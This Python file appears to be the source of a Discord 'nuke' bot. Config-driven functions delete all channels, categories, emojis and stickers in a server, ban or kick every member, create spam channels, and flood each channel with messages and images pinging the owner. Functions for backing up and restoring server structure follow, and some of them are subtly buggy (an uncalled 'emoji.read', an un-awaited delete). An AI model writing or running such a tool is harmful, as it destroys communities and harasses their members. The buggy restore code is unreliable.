import discord
from config import *


async def delete_channels(guild):
    if b_delete_text_channels:
        for channel in guild.text_channels:
            await channel.delete()
    if b_delete_voice_channels:
        for channel in guild.voice_channels:
            await channel.delete()
    if b_delete_categories:
        for category in guild.categories:
            await category.delete()


async def ban_or_kick(guild):
    for member in guild.members:
        if b_ban_users:
            await member.ban()
        elif b_kick_users:
            await member.kick()


async def delete_emojis(guild):
    for emoji in guild.emojis:
        await emoji.delete()


async def delete_stickers(guild):
    for sticker in guild.stickers:
        await sticker.delete()


async def create_channels(guild):
    for i in range(1, num_spam_channels + 1):
        cat = None
        if b_create_categories:
            cat = await guild.create_category(f"{category_name} {i}")
        if b_create_text_channels:
            await guild.create_text_channel(name=text_channel_name, category=cat)
        if b_create_voice_channels:
            await guild.create_voice_channel(name=voice_channel_name, category=cat)


async def spam(guild):
    for channel in guild.text_channels:
        if b_spam_text_channels:
            await channel.send(f"{spam_message}\n{guild.owner.mention}")
        if b_spam_images:
            await channel.send(file=discord.File(fp=spam_img))


async def replace_categories(guild, d):
    categories = [cat.name for cat in guild.categories]
    if categories != d['categories']:
        for category in guild.categories:
            await category.delete()
        for category in d['categories']:
            await guild.create_category(category)


async def replace_text_channels(guild, d):
    text_channels = [(channel, category) for (channel, category) in d['text_channels']]
    existing_text_channels = [(channel.name, channel.category.name if channel.category else 'No category') for channel
                              in guild.text_channels]

    if text_channels != existing_text_channels:
        for channel in guild.text_channels:
            await channel.delete()
        for (channel, category) in text_channels:
            for x in guild.categories:
                if x.name == category:
                    category = x
            if type(category) == str:
                category = None
            await guild.create_text_channel(channel, category=category)


async def replace_voice_channels(guild, d):
    voice_channels = [(channel, category) for (channel, category) in d['voice_channels']]
    existing_voice_channels = [(channel.name, channel.category.name if channel.category else 'No category') for channel
                               in guild.voice_channels]

    if voice_channels != existing_voice_channels:
        for channel in guild.voice_channels:
            await channel.delete()
        for (channel, category) in voice_channels:
            for x in guild.categories:
                if x.name == category:
                    category = x
            if type(category) == str:
                category = None
            await guild.create_voice_channel(channel, category=category)


async def invite_members(guild, d):
    members = [(member.name, member.id) for member in guild.members]
    if members != d['members']:
        set1 = set(members)
        set2 = set(d['members'])
        missing = set2 - set1
        await guild.text_channels[0].send(f'Missing: \n{missing}')


async def serialize_server_info(guild):
    categories = [category.name for category in guild.categories]
    text_channels = [(channel.name, channel.category.name if channel.category else 'No category') for channel in
                     guild.text_channels]
    voice_channels = [(channel.name, channel.category.name if channel.category else 'No category') for channel in
                      guild.voice_channels]
    members = [(member.name, member.id) for member in guild.members]
    icon = await guild.icon.read()
    if guild.banner:
        banner = await guild.banner.read()
    else:
        banner = None
    emojis = [(await emoji.read(), emoji.name) for emoji in guild.emojis]
    return categories, text_channels, voice_channels, members, icon, banner, emojis


async def replace_emojis(guild, d):
    emojis = [(await emoji.read, emoji.name) for emoji in guild.emojis]
    if emojis != d['emojis']:
        if emojis:
            for emoji in guild.emojis:
                emoji.delete()
        for emoji, name in d['emojis']:
            await guild.create_custom_emoji(name=name, image=emoji)
    print(d['emojis'])
